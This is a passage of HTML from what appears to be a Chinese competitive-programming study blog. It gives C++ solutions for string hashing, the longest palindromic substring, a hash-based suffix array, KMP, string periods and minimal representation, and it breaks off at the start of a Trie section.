aria-hidden="true">1733232476103</figcaption></figure><h5 id="兔子与兔子">兔子与兔子</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> P = <span class="hljs-number">131</span>;<br>ULL h[N], p[N];<br><span class="hljs-type">char</span> s[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> h[r] - h[l<span class="hljs-number">-1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s + <span class="hljs-number">1</span>);<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(s + <span class="hljs-number">1</span>);        <span class="hljs-comment">//好久没用了，在string.h头文件</span><br>cin &gt;&gt; n;<br>p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= len; i++)<br>&#123;<br>p[i] = p[i - <span class="hljs-number">1</span>] * P;         <span class="hljs-comment">//进制计算</span><br>h[i] = h[i - <span class="hljs-number">1</span>] * P + s[i];  <span class="hljs-comment">//字符串哈希计算</span><br>&#125;<br><span class="hljs-keyword">while</span> (n--)<br>&#123;<br><span class="hljs-type">int</span> l1, r1, l2, r2;<br>cin &gt;&gt; l1 &gt;&gt; r1 &gt;&gt; l2 &gt;&gt; r2;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">cal</span>(l1, r1) == <span class="hljs-built_in">cal</span>(l2, r2)) cout &lt;&lt; <span class="hljs-string">&quot;Yes&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">else</span> cout &lt;&lt; <span class="hljs-string">&quot;No&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h5 id="回文子串的最大长度">回文子串的最大长度</h5><p>枚举回文字串中心的位置i，</p><p>长度为奇数时，二分找最大长度p，有h(i-p,i)=rh(i,i+p)，总长度为2*p+1</p><p>长度为偶数时，二分找最大长度q，有h(i-q,i-1) =rh(i,i+q-1)，总长度是2*q</p><p>两者取最大</p><p>技巧：转换为同一种</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">2000010</span>;    <span class="hljs-comment">//两倍，为变换留空间</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> P = <span class="hljs-number">131</span>;<br>ULL hl[N], hr[N], p[N];<br><span class="hljs-type">char</span> str[N];<br><br><span class="hljs-function">ULL <span class="hljs-title">get</span><span class="hljs-params">(ULL h[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str + <span class="hljs-number">1</span>), <span class="hljs-built_in">strcmp</span>(str + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;END&quot;</span>))   <span class="hljs-comment">//while(可写逗号表达式，返回的是最后一项的值)</span><br>&#123;<br><span class="hljs-type">int</span> n = <span class="hljs-built_in">strlen</span>(str + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n * <span class="hljs-number">2</span>; i &gt; <span class="hljs-number">0</span>; i -= <span class="hljs-number">2</span>)  <span class="hljs-comment">//在每两个数之间插入一个区分字符，把偶数转换为奇数</span><br>&#123;<br>str[i] = str[i / <span class="hljs-number">2</span>];<br>str[i - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;z&#x27;</span> + <span class="hljs-number">1</span>;<br>&#125;<br>n *= <span class="hljs-number">2</span>;<br>p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = n; i &lt;= n; i++, j--)<br>&#123;<br>p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>hl[i] = hl[i - <span class="hljs-number">1</span>] * P + str[i] - <span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-number">1</span>;<br>hr[i] = hr[i - <span class="hljs-number">1</span>] * P + str[j] - <span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = <span class="hljs-built_in">min</span>(i - <span class="hljs-number">1</span>, n - i);  <span class="hljs-comment">//r有明确的上限</span><br><span class="hljs-keyword">while</span> (r &gt; l)<br>&#123;<br><span class="hljs-type">int</span> mid = (l + r + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">get</span>(hl,i-mid,i<span class="hljs-number">-1</span>) == <span class="hljs-built_in">get</span>(hr, n - (i + mid) + <span class="hljs-number">1</span>, n - (i + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>)) l = mid;    <span class="hljs-comment">//(i+1,i+mid)-&gt; 转换逆序 n-(i+mid)+1,n-(i+1)+1</span><br><span class="hljs-keyword">else</span> r = mid - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">if</span> (str[i - l] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)    <span class="hljs-comment">//该长度包含区分字符，比较两端即可，若该端为字母，则字母比区分字符多一</span><br>ans = <span class="hljs-built_in">max</span>(ans, l + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">else</span><br>ans = <span class="hljs-built_in">max</span>(ans, l);<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Case %d: %d\n&quot;</span>, cnt++, ans);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="后缀数组">后缀数组</h5><figure><img src="/2024/12/03/algorithm-enhance/1733232507227.png" alt="1733232507227"><figcaption aria-hidden="true">1733232507227</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">300010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> P = <span class="hljs-number">131</span>;<br>ULL h[N], p[N];<br><span class="hljs-type">char</span> str[N];<br><span class="hljs-type">int</span> SA[N];<br><span class="hljs-type">int</span> height[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function">ULL <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">comp</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span>  <span class="hljs-comment">//x&lt;y</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> r = <span class="hljs-built_in">min</span>(n - x + <span class="hljs-number">1</span>, n - y + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">while</span> (r &gt; l)<br>&#123;<br><span class="hljs-type">int</span> mid = (l + r + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> h1 = <span class="hljs-built_in">cal</span>(x, x + mid - <span class="hljs-number">1</span>);<br><span class="hljs-type">int</span> h2 = <span class="hljs-built_in">cal</span>(y, y + mid - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (h1 == h2) l = mid;<br><span class="hljs-keyword">else</span> r = mid - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> str[x + l] &lt; str[y + l];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br><span class="hljs-type">int</span> x = SA[(l + r) / <span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> i = l - <span class="hljs-number">1</span>, j = r + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (i &lt; j)<br>&#123;<br><span class="hljs-keyword">do</span> i++; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">comp</span>(SA[i], x));<br><span class="hljs-keyword">do</span> j--; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">comp</span>(x, SA[j]));<br><span class="hljs-keyword">if</span> (i &lt; j) <span class="hljs-built_in">swap</span>(SA[i], SA[j]);<br>&#125;<br><span class="hljs-built_in">quick_sort</span>(l, j);<br><span class="hljs-built_in">quick_sort</span>(j + <span class="hljs-number">1</span>, r);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">commom_length</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> r = <span class="hljs-built_in">min</span>(n - x + <span class="hljs-number">1</span>, n - y + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">while</span> (r &gt; l)<br>&#123;<br><span class="hljs-type">int</span> mid = (l + r + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">cal</span>(x, x+mid<span class="hljs-number">-1</span>) == <span class="hljs-built_in">cal</span>(y, y+mid<span class="hljs-number">-1</span>)) l = mid;<br><span class="hljs-keyword">else</span> r = mid - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> l;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str + <span class="hljs-number">1</span>);<br>n = <span class="hljs-built_in">strlen</span>(str + <span class="hljs-number">1</span>);<br>p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br>SA[i] = i;<br>&#125;<br><span class="hljs-built_in">quick_sort</span>(<span class="hljs-number">1</span>,n);<br>height[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)<br>&#123;<br>height[i] = <span class="hljs-built_in">commom_length</span>(SA[i - <span class="hljs-number">1</span>], SA[i]);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>cout &lt;&lt; SA[i] - <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>cout &lt;&lt; height[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="字符串">字符串</h3><h4 id="kmp">KMP</h4><p>关于next数组的计算参考p72。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000010</span>;<br><span class="hljs-type">char</span> s[N];<br><span class="hljs-type">char</span> p[N];<br><span class="hljs-type">int</span> n, m;<br><span class="hljs-type">int</span> ne[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; p + <span class="hljs-number">1</span> &gt;&gt; m &gt;&gt; s + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>, j = <span class="hljs-number">0</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];<br><span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>])j++;<br>ne[i] = j;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt;= m; i++)<br>&#123;<br><span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; s[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];<br><span class="hljs-keyword">if</span> (s[i] == p[j + <span class="hljs-number">1</span>]) j++;<br><span class="hljs-keyword">if</span> (j == n)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, i - n);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="周期">周期</h4><p>引理：（证明见p74）</p><figure><img src="/2024/12/03/algorithm-enhance/1733232537430.png" alt="1733232537430"><figcaption aria-hidden="true">1733232537430</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000010</span>;<br><span class="hljs-type">char</span> str[N];<br><span class="hljs-type">int</span> ne[N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (cin &gt;&gt; n, n != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>, j = <span class="hljs-number">0</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; str[i] != str[j + <span class="hljs-number">1</span>]) j = ne[j];<br><span class="hljs-keyword">if</span> (str[i] == str[j + <span class="hljs-number">1</span>]) j++;<br>ne[i] = j;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Test case #%d\n&quot;</span>, cnt++);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-type">int</span> len = i - ne[i];<br><span class="hljs-type">int</span> k = i / len;<br><span class="hljs-keyword">if</span> (i % len == <span class="hljs-number">0</span> &amp;&amp; k &gt; <span class="hljs-number">1</span>)<br>&#123;<br>cout &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; k &lt;&lt; endl;<br>&#125;<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最小表示法">最小表示法</h4><p>每次循环一位将字符串的首个字符放到字符串末尾，然后得到字符串的最小字典序就是最小表示法。(字符串的最小表示)</p><p>双指针算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">600010</span>;<br><span class="hljs-type">int</span> str[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; str[i];<br>&#125;<br><span class="hljs-comment">//首尾拼接</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n + <span class="hljs-number">1</span>; i &lt;= n + n; i++)<br>&#123;<br>str[i] = str[i - n];<br>&#125;<br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">2</span>, k;<br><span class="hljs-keyword">while</span> (i &lt;= n &amp;&amp; j &lt;= n)<br>&#123;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; n &amp;&amp; str[i + k] == str[j + k]; k++);<br><span class="hljs-keyword">if</span> (k == n)<span class="hljs-keyword">break</span>;   <span class="hljs-comment">//存在更小的循环元，且已经扫描完毕</span><br><span class="hljs-keyword">if</span> (str[i + k] &gt; str[j + k])<br>&#123;<br>i = i + k + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (i == j) i++;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>j = j + k + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (i == j) j++;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-built_in">min</span>(i, j);  <span class="hljs-comment">//得到以s[ans]开头的同构串</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = ans; i &lt; ans + n; i++)<br>&#123;<br>cout &lt;&lt; str[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="trie字典树">Trie字典树</h3><p>举例：</p><figure><img src="/2024/12/03/algorithm-enhance/1733232565440.png" alt="1733232565440"><figcaption aria-hidden="true">1733232565440</figcaption></figure><h4 id="创建与查找">创建与查找</h4><p>ini:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> trie[SIZE][<span class="hljs-number">26</span>];  <span class="hljs-comment">//SIZE表示结点数，26表示字符集大小，trie[i][]记录子节点编号</span><br><span class="hljs-type">bool</span> end[SIZE];  <span class="hljs-comment">//判断是否为字符串结尾标志</span><br><span class="hljs-type">int</span> tot = <span class="hljs-number">1</span>;   <span class="hljs-comment">//根节点</span><br></code></pre></td></tr></table></figure><p>insert：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>   <span class="hljs-type">int</span> p = <span class="hljs-number">1</span>;   <span class="hljs-comment">//当前节点，从根节点开始</span><br>    <span class="hljs-keyword">for</span>(<span 